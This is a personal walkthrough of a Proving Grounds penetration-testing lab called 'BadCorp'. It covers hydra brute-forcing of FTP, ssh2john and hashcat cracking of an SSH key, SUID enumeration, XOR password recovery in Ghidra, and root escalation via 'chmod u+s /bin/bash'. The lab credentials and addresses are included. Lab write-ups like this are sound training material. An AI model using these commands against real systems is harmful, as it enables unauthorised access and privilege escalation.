---
title: BadCorp
date: 2026-04-16T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - Hashcat
  - hydra
  - ssh
  - SUID
  - ftp
  - linux
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: BadCorp"
---


![](Screenshot%202026-04-12%20at%2008.09.50.png)


![](Screenshot%202026-04-12%20at%2008.10.18.png)

I had to look this up in another guide, I was close. It was obvious that the usernames and passwords were here but in what format. 

For the usernames I should have been trying:  
justinh  
justin.hammer  
jhammer  
hammer  

I tried many different variations for the password:  
+23-34567890  
+23-345-67890  
2334567890  
34567890  


hydra -L henry -P henry-pass 192.168.119.133 ftp 

![](Screenshot%202026-04-17%20at%2007.49.30.png)

hoswald:34566550

![](Screenshot%202026-04-17%20at%2007.53.23.png)

Hydra for some reason is quite a lot faster.

Login to ftp and grab the binary.

![](Screenshot%202026-04-17%20at%2007.00.35.png)

ssh -i id_rsa  hoswald@192.168.131.133

![](Screenshot%202026-04-17%20at%2007.01.42.png)

The ssh key file is encrypted. 

ssh2john will extract the password hash from the file so you can run hashcat. 

`ssh2john id_rsa`

![](Screenshot%202026-04-17%20at%2007.14.17.png)

![](Screenshot%202026-04-17%20at%2007.15.14.png)

`hashcat -m 22931 ssh-id /usr/share/wordlists/rockyou.txt.gz`

![](Screenshot%202026-04-17%20at%2007.15.54.png)

ssh into the machine.

![](Screenshot%202026-04-17%20at%2007.17.39.png)

python3 -c 'import pty; pty.spawn("/bin/bash")'

![](Screenshot%202026-04-17%20at%2007.22.07.png)

cat /etc/*-release

![](Screenshot%202026-04-12%20at%2016.02.44.png)


**SUID**  

find / -perm -u=s /2>/dev/null  
ls -lah /usr/local/bin/backup

![](Screenshot%202026-04-16%20at%2009.20.44.png)

There is probably an encrypted password in this binary.

![](Screenshot%202026-04-16%20at%2009.23.06.png)![](Screenshot%202026-04-16%20at%2009.27.45.png)

Move the binary onto your kali machine and open it with ghidra

`scp -i id_rsa  hoswald@192.168.242.133:/usr/local/bin/backup .`

![](Screenshot%202026-04-16%20at%2010.04.05.png)

![](Screenshot%202026-04-16%20at%2009.47.39.png)

![](Screenshot%202026-04-16%20at%2010.05.48.png)

![](Screenshot%202026-04-16%20at%2010.07.06.png)

This is where I got a little stuck. This XOR encryption is apparently very common in these labs. 
The key is sitting just above the 'pw' variable.

![](Screenshot%202026-04-16%20at%2010.21.23.png)

p4ssw0r6

![](Screenshot%202026-04-16%20at%2015.22.38.png)

![](Screenshot%202026-04-17%20at%2006.48.31.png)

Once the backup binary has been executed you will see your user change to root. 
Unfortunately the shell that has been spawned is unresponsive. Input the command(while as root) 'chmod u+s /bin/bash', then exit the root shell. 

`/bin/bash -p`

You shoud have a working shell now.